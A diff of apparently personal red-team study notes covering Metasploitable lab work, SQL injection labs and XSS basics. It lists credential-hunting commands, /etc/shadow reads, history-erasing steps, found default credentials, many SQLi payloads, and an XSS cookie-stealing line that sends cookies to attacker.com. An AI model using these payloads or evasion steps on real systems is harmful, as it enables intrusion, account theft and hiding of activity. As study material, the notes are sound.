@@ -27,6 +27,11 @@ grep -r "password" /etc/ 2>/dev/null
 what i learned: searches inside every file in /etc/ for the word password
 why it matters: admins sometimes leave credentials in config files
 
+Find PHP files containing password in web root: [DONE]
+find /var/www -name "*.php" | xargs grep -l "password" 2>/dev/null
+what i learned: finds all PHP files in web server directory containing password
+why it matters: web app config files often have hardcoded database credentials
+
 List users with real shells: [DONE]
 cat /etc/passwd | grep "/bin/bash"
 what i learned: filters to only accounts using bash — almost always real humans
@@ -99,6 +104,15 @@ what i found on Metasploitable:
 why it matters: private SSH key can be copied and used to access
                other servers that trust this key — no password needed
 
+Read shadow file: [DONE]
+sudo cat /etc/shadow
+hashing algorithm prefixes:
+$1$ = MD5 — weak, crackable fast
+$5$ = SHA-256 — stronger
+$6$ = SHA-512 — strongest
+Metasploitable uses MD5 — crackable in Stage 3 with hashcat
+crack online: crackstation.net — paste the hash only, not the full line
+
 Full OPSEC routine — do this every session: [DONE]
 1. SSH into target
 2. unset HISTFILE && export HISTSIZE=0
@@ -109,6 +123,29 @@ Full OPSEC routine — do this every session: [DONE]
 7. verify: grep "192.168.56.102" /var/log/auth.log
 8. history — should return nothing
 9. exit
+
+======================================================
+CREDENTIALS FOUND ON METASPLOITABLE
+======================================================
+
+DVWA database config — /var/www/dvwa/config/config.inc.php:
+db_server:   localhost
+db_database: dvwa
+db_user:     root
+db_password: (empty)
+
+TikiWiki database config — /var/www/tikiwiki/db/tiki-db.php:
+host_tiki:  localhost
+user_tiki:  root
+pass_tiki:  (empty)
+dbs_tiki:   tiki
+
+Tomcat credentials — /etc/tomcat5.5/tomcat-users.xml:
+username: tomcat  password: tomcat  roles: admin,manager
+username: both    password: tomcat
+
+MySQL direct access: root with no password
+VNC default password: password → gives root GUI desktop
 
 ======================================================
 WINDOWS
@@ -193,7 +230,6 @@ what i learned: connects to a port and reads whatever the service sends back
 Send raw HTTP GET: [DONE]
 nc TARGET_IP 80
 then type: GET / HTTP/1.0 and press Enter twice
-what i learned: manually sends HTTP request without a browser
 what it revealed on Metasploitable:
 - Apache 2.2.8 Ubuntu — old version
 - PHP 5.2.4 — ancient, multiple exploits
@@ -209,60 +245,54 @@ ip.addr == TARGET_IP
 Filter FTP in Wireshark: [DONE]
 ip.addr == TARGET_IP && ftp
 
+Follow TCP Stream in Wireshark: [DONE]
+right click any packet → Follow → TCP Stream
+shows entire conversation as readable text
+use this on any captured session to read the full exchange
+
 File transfer via Python HTTP server: [DONE]
 on Kali:   python3 -m http.server 8080
 on target: wget http://192.168.56.102:8080/filename
-what i learned: Kali becomes a web server
-               target downloads the file with wget
-               Kali terminal shows GET request when file is downloaded
 
 File transfer via netcat send: [DONE]
 nc TARGET_IP 4444 < file.txt
-what i learned: sends file contents through netcat to listener
 
 File transfer via netcat receive: [DONE]
 nc -lvp 4444 > file.txt
 what i learned: -l listen, -v verbose, -p port number
-               opens a listener and saves whatever arrives to a file
 
 Check routing table: [DONE]
 route -n
 what i found on Kali:
 default gateway:  10.0.2.1    via eth1 — internet traffic goes here
-lab network:      192.168.56.0 via eth0 — direct connection to Metasploitable
+lab network:      192.168.56.0 via eth0 — direct to Metasploitable
 eth0: Host-Only network — lab
 eth1: NAT network — internet
 
 Check ARP table: [DONE]
 arp -a
-what i learned: shows IP to MAC address mappings on my network
 
 MySQL direct access: [DONE]
 mysql -h 192.168.56.104 -u root --skip-ssl
 no password required — critical misconfiguration
 databases found: dvwa, metasploit, mysql, owasp10, tikiwiki
-dvwa users table contains MD5 hashed passwords
-admin password hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
-crack hashes: crackstation.net or hashcat in Stage 3
-
-Follow TCP Stream in Wireshark: [DONE]
-right click any packet → Follow → TCP Stream
-shows entire conversation as readable text
-FTP: credentials visible in plaintext
-use this on any captured session to read the full exchange
+dvwa admin hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"
 
 SMTP username enumeration: [DONE]
 nc TARGET_IP 25
 VRFY username
 252 = user exists
 550 = user does not exist
-real use: build username list for brute force attacks
+confirmed on Metasploitable: root, msfadmin, nobody exist — admin does not
 
 VNC access: [DONE]
 vncviewer 192.168.56.104
 default password: password
-got: root GUI desktop — root@metasploitable:/#
-critical: no exploit needed — default credentials = root access
+result: root GUI desktop — no exploit needed
+
+Bindshell instant root: [DONE]
+nc 192.168.56.104 1524
+result: root@metasploitable:/# — instant root shell, no credentials needed
 
 ======================================================
 SSH
@@ -271,29 +301,23 @@ SSH
 Basic connect: [DONE]
 ssh user@IP
 
-Connect with private key: [DONE — used in Bandit]
+Connect with private key: [DONE]
 ssh user@IP -i keyfile
 
-Connect on custom port: [DONE — used in Bandit]
+Connect on custom port: [DONE]
 ssh user@IP -p 2222
 
 Connect to old server with RSA key: [DONE]
 ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@IP
-what i learned: Metasploitable uses old SSH — modern Kali rejects it by default
-               these flags force Kali to accept the old key type
 
-Generate key pair: [TAUGHT — need to practice]
+Generate key pair: [TAUGHT]
 ssh-keygen -t rsa -b 4096
-what i learned: creates id_rsa (private) and id_rsa.pub (public)
-               private key stays on my machine, public goes on target
 
-Copy public key to target: [TAUGHT — need to practice]
+Copy public key to target: [TAUGHT]
 ssh-copy-id user@IP
 
-Port forwarding: [TAUGHT — practice in Stage 4]
+Port forwarding: [STAGE 4]
 ssh -L localport:target:targetport user@IP
-what i learned: tunnels a remote port to my local machine
-               used for pivoting in red team engagements
 
 Brute force SSH: [STAGE 3]
 hydra -l user -P wordlist ssh://IP
@@ -311,32 +335,22 @@ proxychains curl ifconfig.me
 Run any tool through TOR: [DONE]
 proxychains TOOL OPTIONS
 
-Config file location: [DONE]
-/etc/proxychains4.conf
+Config file: /etc/proxychains4.conf
 
 ======================================================
 MY PYTHON TOOLS — BUILT FROM SCRATCH
 ======================================================
 
-Single port checker: [DONE]
-python3 ~/red-team-tools/python-tools/single_port_checker.py
-what it does: checks if one port is open or closed
-
-Port scanner: [DONE]
-python3 ~/red-team-tools/python-tools/port_scanner.py
-what it does: scans ports 1-1024 and prints open ones only
-
-Banner grabber: [DONE]
-python3 ~/red-team-tools/python-tools/banner_grabber.py
-what it does: connects to a port and grabs the service banner
-
-Full recon tool: [DONE]
-python3 ~/red-team-tools/python-tools/recon.py
-what it does: combines scanner and banner grabber in one tool
-
-Advanced recon tool: [DONE]
-python3 ~/red-team-tools/python-tools/recon_advanced.py
-what it does: scanner + banner grabber + service dictionary + table output + timestamp
+Single port checker:    python3 ~/red-team-tools/python-tools/single_port_checker.py
+Port scanner:           python3 ~/red-team-tools/python-tools/port_scanner.py
+Banner grabber:         python3 ~/red-team-tools/python-tools/banner_grabber.py
+Full recon tool:        python3 ~/red-team-tools/python-tools/recon.py
+Advanced recon tool:    python3 ~/red-team-tools/python-tools/recon_advanced.py
+Scanner with args:      python3 ~/red-team-tools/python-tools/scanner.py TARGET_IP
+Multi-service checker:  python3 ~/red-team-tools/python-tools/multi-service-checker.py
+Anonymous FTP checker:  python3 ~/red-team-tools/python-tools/check_anonymous_ftp.py
+Port+targets scanner:   python3 ~/red-team-tools/python-tools/port_and_targets/main.py
+Timestamped scanner:    python3 ~/red-team-tools/python-tools/port_scanner/scanner.py TARGET_IP
 
 ======================================================
 MY LAB
@@ -367,7 +381,7 @@ Port 139  SMB         Samba 3.0.20        CRITICAL
 Port 445  SMB         Samba 3.0.20        CRITICAL
 Port 512  rexec       Where are you?      HIGH
 Port 513  rlogin                          HIGH
-Port 514  rsh         name resolution     HIGH
+Port 514  rsh                             HIGH
 Port 1099 Java RMI                        MEDIUM
 Port 1524 Bindshell   root shell open     CRITICAL
 Port 2049 NFS                             MEDIUM
@@ -377,9 +391,8 @@ Port 5432 PostgreSQL  8.3.0               HIGH
 Port 5900 VNC         protocol 3.3        HIGH
 Port 6667 IRC         UnrealIRCd          CRITICAL
 Port 8180 Tomcat      Apache Tomcat       HIGH
-Port 8787  Metasploit    backdoor listener   CRITICAL
-Port 3632  distccd       compiler daemon RCE HIGH
- 
+Port 8787 Metasploit  backdoor listener   CRITICAL
+Port 3632 distccd     compiler daemon RCE HIGH
 
 ======================================================
 WEB APP SECURITY — SQL INJECTION
@@ -403,7 +416,6 @@ password check is commented out — logged in as admin without password
 Why ' works:
 SQL strings are wrapped in single quotes
 injecting ' breaks out of the string and lets you write your own SQL
-that is the entire concept of SQLi in one sentence
 
 Types of SQLi:
 
@@ -411,268 +423,199 @@ IN-BAND — attack and result use same channel
   Error-based  — force DB errors to reveal version and structure info
   Union-based  — combine queries with UNION to pull extra data from DB
 
-INFERENTIAL (BLIND) — no data transferred directly, no visible output
+INFERENTIAL (BLIND) — no data transferred directly
   Boolean-based — send true/false conditions, observe page differences
-                  true condition: page loads normally
-                  false condition: page changes or errors
-                  extract data character by character based on differences
-  Time-based    — send sleep command inside query
-                  if page delays — condition is true
-                  if page loads instantly — condition is false
-                  no visible page change, only timing tells you the answer
+  Time-based    — send sleep command, observe response delay
 
-OUT-OF-BAND — DB sends data to attacker external server
-              DB makes DNS lookup to attacker.com carrying stolen data
-              used when in-band and inferential are both blocked
-              never see response in app — arrives at your external server
+OUT-OF-BAND — DB sends data to attacker external server via DNS/HTTP
 
 Key SQL vocabulary:
 SELECT * FROM users     — get all data from users table
 WHERE username='ahmed'  — filter condition
 AND / OR                — combine conditions
-'                       — breaks string context — injection point
+'                       — breaks string context
 --                      — comments out rest of query
 UNION                   — combines two query results into one
 ORDER BY 1,2,3          — used to detect number of columns
 NULL                    — used in column count detection
 
-Testing perspective:
-Black-box — only URL, no source code, test like real attacker
-White-box — have source code, more thorough testing possible
-
 Finding SQLi:
 submit ' and look for errors or behavior changes
-submit '' two quotes and see if error disappears
-submit SQL specific syntax and observe differences
+submit '' and see if error disappears
 
-Column count detection with ORDER BY:
+Column count detection:
 ORDER BY 1 — works
 ORDER BY 2 — works
 ORDER BY 3 — error = 2 columns exist
 
-UNION attack — requires:
-1. know number of columns in original query
-2. know compatible data types of each column
-3. use UNION SELECT to pull target data from other tables
-
-Exploit approaches:
-Error-based:   enter SQL characters, look for error messages revealing DB info
-Union-based:   find column count with ORDER BY, then UNION SELECT stolen data
-Boolean-based: submit true/false conditions, observe page differences
-Time-based:    submit sleep condition, measure response delay
+UNION attack requires:
+1. column count
+2. compatible data types
+3. UNION SELECT to pull target data
 
 Prevention:
-Primary:    parameterized queries — prepared statements
-            never put user input directly into SQL query
-Additional: input validation, WAF, least privilege DB accounts
+parameterized queries — prepared statements
+input validation, WAF, least privilege DB accounts
 
-
-Lab 01 — WHERE clause hidden data retrieval — DONE
-goal: retrieve unreleased products
-payload: ' or 1=1--
-original query: SELECT * FROM products WHERE category='Gifts' AND released=1
-injected query: SELECT * FROM products WHERE category='' OR 1=1--' AND released=1
-why it works:
-- ' closes the string early
-- OR 1=1 always true — returns all rows
-- -- comments out AND released=1
-- unreleased products now visible
-note: try '-- - with space if -- alone does not work on MySQL
-
-Lab 02 — Login bypass via SQL injection — DONE
-goal: log in as administrator without knowing the password
-payload: administrator'-- in username field, anything in password
-original query: SELECT * FROM users WHERE username='administrator' AND password='pass'
-injected query: SELECT * FROM users WHERE username='administrator'--' AND password='pass'
-why it works:
-- ' closes the username string early
-- -- comments out AND password check entirely
-- database only checks if username exists — password ignored
-- logged in as administrator
-real world use: any login form that builds SQL queries without parameterization
-
-Lab 03 — Oracle version extraction — DONE
-payload: ' UNION SELECT banner,NULL FROM v$version--
-note: Oracle requires FROM clause — use FROM dual for empty queries
-
-Lab 04 — MySQL/MSSQL version extraction — DONE
-payload: ' UNION SELECT @@version,NULL--%20
-note: MySQL comment requires space after -- so use --%20 in URL
-note: do not use FROM dual for MySQL — Oracle only
-
-Lab 05 — Database contents extraction — DONE
-methodology:
-1. find column count with ORDER BY
-2. find text column with UNION SELECT 'test',NULL
-3. list all tables: ' UNION SELECT table_name,NULL FROM information_schema.tables--
-4. list columns: ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target_table'--
-5. dump data: ' UNION SELECT username_col,password_col FROM target_table--
-6. login with extracted credentials
-
-Lab 06 — Oracle database contents extraction — DONE
-same as Lab 05 but Oracle syntax
-list tables:   ' UNION SELECT table_name,NULL FROM all_tables--
-list columns:  ' UNION SELECT column_name,NULL FROM all_columns
-               WHERE table_name='USERS_KHBIUX'--
-dump data:     ' UNION SELECT USERNAME_KSLLLN,PASSWORD_SAGGFL
-               FROM USERS_KHBIUX--
-note: Oracle uses all_tables and all_columns not information_schema
-
-Lab 07 — Finding column count with NULL — DONE
-goal: find number of columns using UNION SELECT NULL
-method: add NULLs one at a time until page loads without error
-' UNION SELECT NULL--
-' UNION SELECT NULL,NULL--
-' UNION SELECT NULL,NULL,NULL-- ← page loaded = 3 columns
-
-Lab 08 — Finding text columns — DONE
-goal: find which column accepts string data
-method: replace each NULL with a string one at a time
-' UNION SELECT 'test',NULL,NULL--
-' UNION SELECT NULL,'test',NULL--
-' UNION SELECT NULL,NULL,'test'--
-whichever loads without error = that column accepts strings
-
-Lab 09 — Retrieving data from other tables — DONE
-goal: dump username and password from users table
-payload: ' UNION SELECT username,password FROM users--
-URL encoded: %27%20UNION%20SELECT%20username,password%20FROM%20users--
-note: URL encoding bypasses some filters and browser restrictions
-
-Lab 10 — Retrieving multiple values in single column — DONE
-goal: dump two values when only one column accepts strings
-technique: CONCAT combines multiple values into one string
-payload: ' UNION SELECT NULL,CONCAT(username,password) FROM users--
-better:  ' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
-why better: separator makes splitting username from password easy
-PostgreSQL alternative: username||':'||password (double pipe)
-
-Lab 11 — Blind SQLi with conditional responses — DONE
-type: boolean-based blind SQLi
-injection point: tracking cookie not URL parameter
-feedback: Welcome back appears = TRUE, disappears = FALSE
-
-Burp Intruder settings:
-attack type: cluster bomb
-payload 1:  numbers 1 to 20 (character positions)
-payload 2:  a-z and 0-9 (characters to test)
-grep match: Welcome back
-result: requests with Welcome back = correct character at that position
-
-Lab 12 — Blind SQLi with conditional errors — Oracle — DONE
-feedback: server error = TRUE, normal page = FALSE
-needed video first to understand CASE WHEN concept
-
-step 1 — confirm database type:
-' AND (SELECT '' FROM dual)='  →  Oracle confirmed
-
-step 2 — confirm conditional errors work:
-TRUE:  ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
-FALSE: ' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
-
-step 3 — confirm administrator exists:
-' AND (SELECT CASE WHEN (username='administrator') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
-
-step 4 — find password length:
-' AND (SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
-
-step 5 — extract characters:
-' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
-
-key concepts:
-CASE WHEN condition THEN result1 ELSE result2 END — SQL if/else
-TO_CHAR(1/0) — divide by zero forces Oracle error
-SUBSTR(string,pos,len) — Oracle character extraction
-error = TRUE signal, no error = FALSE signal
-
-Burp Intruder: cluster bomb
-payload 1: position 1 to password length
-payload 2: a-z 0-9
-look for: error responses = correct character
-
-Lab 13 — Blind SQLi with time delays — DONE
-feedback: page delay = TRUE, instant response = FALSE
-goal: cause a 10 second delay
-
-payloads by database:
-Oracle:     '|| dbms_pipe.receive_message(('a'),10)--
-MSSQL:      '|| WAITFOR DELAY '0:0:10'--
-PostgreSQL: '|| (SELECT pg_sleep(10))--
-MySQL:      '|| (SELECT SLEEP(10))--
-
-how to identify database: test all four, whichever delays = that database
-this lab: PostgreSQL confirmed
-
-Lab 14 — Blind SQLi time-based information retrieval — DONE
-same as Lab 12 but delay = TRUE instead of error = TRUE
-PostgreSQL uses pg_sleep() not TO_CHAR(1/0)
-|| is PostgreSQL string concatenation
-
-confirm user:
-'||(SELECT CASE WHEN (username='administrator') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
-delay = administrator exists
-
-find length:
-'||(SELECT CASE WHEN (username='administrator' AND LENGTH(password)>N) THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
-delay = length is greater than N
-
-extract characters:
-'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
-delay = correct character at that position
-
-PostgreSQL syntax:
-|| = string concatenation
-pg_sleep(seconds) = time delay
-SUBSTR = same as Oracle
-CASE WHEN = same structure as Oracle
-
-difference from in-band SQLi:
-in-band: see results directly on page
-blind:   only true/false signal — extract data character by character
-
-methodology:
-1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
-2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
-3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
-   increment N until Welcome back disappears — that N is the length
-4. extract chars: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POSITION,1)='CHAR'--
-   use Burp Intruder cluster bomb — position 1-20, chars a-z 0-9
-5. assemble password from results and login
-
-key functions:
-SUBSTRING(string, position, length) — extracts characters
-LENGTH(string)                      — returns string length
-
-difference from in-band SQLi:
-in-band:  see results directly on page
-blind:    only true/false signal — extract data character by character
-
-DATABASE VERSION QUERIES — CHEAT SHEET
+DATABASE VERSION QUERIES
 Oracle:     SELECT banner FROM v$version
 MySQL:      SELECT @@version
 PostgreSQL: SELECT version()
 MSSQL:      SELECT @@version
 
 IDENTIFY DATABASE TYPE
-Oracle:     FROM dual works in query
-MySQL:      # works as comment, VERSION() works
+Oracle:     FROM dual works
+MySQL:      # works as comment
 PostgreSQL: SELECT version() works
 MSSQL:      SELECT @@version works
 
-URL ENCODING — use when browser blocks special characters
-'  = %27
-space = %20
-example: %27%20UNION%20SELECT...
-
+URL ENCODING
+' = %27   space = %20
 REFERENCE: portswigger.net/web-security/sql-injection/cheat-sheet
 
 information_schema — built-in database map (not Oracle)
 information_schema.tables  — all table names
 information_schema.columns — all column names per table
+Oracle: all_tables / all_columns
 
-Oracle equivalent:
-list tables:   SELECT table_name FROM all_tables
-list columns:  SELECT column_name FROM all_columns WHERE table_name='target'
+Lab 01 — WHERE clause hidden data retrieval — DONE
+payload: ' or 1=1--
+why: OR 1=1 always true, -- comments out AND released=1
+
+Lab 02 — Login bypass — DONE
+payload: administrator'-- in username field
+why: -- comments out password check entirely
+
+Lab 03 — Oracle version extraction — DONE
+payload: ' UNION SELECT banner,NULL FROM v$version--
+
+Lab 04 — MySQL/MSSQL version extraction — DONE
+payload: ' UNION SELECT @@version,NULL--%20
+note: MySQL comment needs space after -- so use --%20
+
+Lab 05 — Database contents extraction — DONE
+1. ORDER BY to find column count
+2. UNION SELECT 'test',NULL to find text column
+3. ' UNION SELECT table_name,NULL FROM information_schema.tables--
+4. ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target'--
+5. ' UNION SELECT username_col,password_col FROM target_table--
+
+Lab 06 — Oracle database contents — DONE
+list tables:   ' UNION SELECT table_name,NULL FROM all_tables--
+list columns:  ' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='TARGET'--
+dump data:     ' UNION SELECT col1,col2 FROM target_table--
+
+Lab 07 — Column count with NULL — DONE
+add NULLs until page loads: ' UNION SELECT NULL,NULL,NULL--
+
+Lab 08 — Finding text columns — DONE
+replace each NULL with 'test' until page loads without error
+
+Lab 09 — Retrieving table data — DONE
+payload: ' UNION SELECT username,password FROM users--
+
+Lab 10 — Multiple values in single column — DONE
+payload: ' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
+PostgreSQL: username||':'||password
+
+Lab 11 — Blind SQLi boolean-based — DONE
+feedback: Welcome back = TRUE, no Welcome back = FALSE
+inject into tracking cookie
+1. confirm: ' AND 1=1-- vs ' AND 1=2--
+2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
+3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
+4. extract: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POS,1)='CHAR'--
+Burp Intruder cluster bomb: payload1=positions 1-20, payload2=a-z 0-9, grep=Welcome back
+
+Lab 12 — Blind SQLi conditional errors — Oracle — DONE
+feedback: server error = TRUE, normal page = FALSE
+confirm: ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
+extract: ' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
+key: CASE WHEN = SQL if/else, TO_CHAR(1/0) = divide by zero error
+
+Lab 13 — Blind SQLi time delays — DONE
+PostgreSQL: '|| (SELECT pg_sleep(10))--
+identify database: test all four, whichever delays = that database
+
+Lab 14 — Blind SQLi time-based retrieval — DONE
+'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
+delay = correct character
+
+======================================================
+WEB APP SECURITY — XSS (CROSS-SITE SCRIPTING)
+======================================================
+
+What XSS is:
+attacker injects malicious JavaScript into a trusted website
+browser executes it thinking it came from the trusted site
+target is the victim's browser, not the server
+
+JavaScript basics needed:
+alert(1)            — popup, basic proof of concept
+document.cookie     — all browser cookies for the site
+document.domain     — domain name, used to confirm XSS in labs
+fetch('url')        — HTTP request, used to exfiltrate data
+<script>code</script> — executes JavaScript
+
+Types of XSS:
+REFLECTED  — payload in URL, server reflects it back once
+             only affects users who click the malicious link
+STORED     — payload saved to database, fires for every visitor
+             most dangerous type
+DOM-BASED  — vulnerability in client-side JavaScript
+             server never sees the payload
+             page's own JS writes unsanitized input into the DOM
+
+Standard payloads:
+basic:         <script>alert(1)</script>
+img onerror:   <img src=x onerror=alert(1)>
+svg onload:    <svg onload=alert(1)>
+attribute:     " autofocus onfocus=alert(1) x="
+javascript URL: javascript:alert(document.cookie)
+cookie steal:  <script>fetch('https://attacker.com?c='+document.cookie)</script>
+
+Lab goal: make alert(document.domain) execute in the browser
+
+HTML contexts and matching payloads:
+between tags:     <p>INPUT</p>          → <script>alert(1)</script> or <img src=x onerror=alert(1)>
+inside attribute: <input value="INPUT"> → "><script>alert(1)</script>
+inside JS string: var x='INPUT'         → ';alert(1)//
+inside href:      <a href="INPUT">      → javascript:alert(document.cookie)
+innerHTML sink:   JS writes INPUT to DOM → script tags BLOCKED → use <img src=x onerror=alert(1)>
+
+Key concept — innerHTML blocks script tags:
+browsers block <script> injected via innerHTML
+always use event handlers instead: onerror, onload, onfocus, onmouseover
+
+XSS testing methodology:
+1. find every input point — search boxes, URL params, form fields
+2. submit unique test string: xsstest123
+3. view page source: Ctrl+U → search for xsstest123
+4. identify HTML context surrounding your string
+5. pick payload matching that context
+6. if blocked: try alternative tags/events, try URL encoding
+7. confirm: alert(document.domain) fires = XSS confirmed
+
+Real bug bounty universal probe:
+"><img src=x onerror=alert(1)>
+covers attribute context AND event handler execution
+
+XSS prevention:
+output encoding:  convert < to &lt; and > to &gt; before rendering
+CSP header:       restrict which scripts browser will execute
+input validation: reject dangerous characters at input
+
+Lab 01 XSS — Reflected XSS in HTML context — DONE
+payload: <script>alert(1)</script> in search box
+
+Lab 02 XSS — Stored XSS in comment field — DONE
+payload: <script>alert(1)</script> in comment/input that gets stored
+
+Lab 03 XSS — DOM XSS via document.write and location.search — DONE
+source: location.search (URL parameter)
+sink: document.write (writes to page)
+payload: <script>alert(1)</script> in search parameter
+why it works: document.write puts your input directly into page HTML
 
 ======================================================
 THINGS I STILL NEED TO PRACTICE
@@ -695,10 +638,17 @@ THINGS I STILL NEED TO PRACTICE
 [x] run nmap -sC and read script output — DONE
 [x] run nmap -sV and identify all services — DONE
 [x] find SUID binaries on Metasploitable — DONE
+[x] find PHP config files with credentials — DONE
+[x] connect to bindshell port 1524 — instant root — DONE
+[x] VNC access with default credentials — DONE
+[x] MySQL direct access no password — DONE
+[x] SMTP username enumeration — DONE
+[x] find SUID binaries on Metasploitable — DONE
 [x] list users with real shells — DONE
 [x] SSH into Metasploitable — DONE
 [x] read auth.log live while SSHing in — DONE
 [x] grep failed and accepted logins from auth.log — DONE
-[x] built 4 Python tools from scratch — DONE
+[x] built 10+ Python tools from scratch — DONE
 [x] set up GitHub and pushed all tools — DONE
-[x] watched first SQLi video — introduction complete — DONE
+[x] SQLi complete — 14 labs done — DONE
+[x] XSS labs 1-3 done — DONE
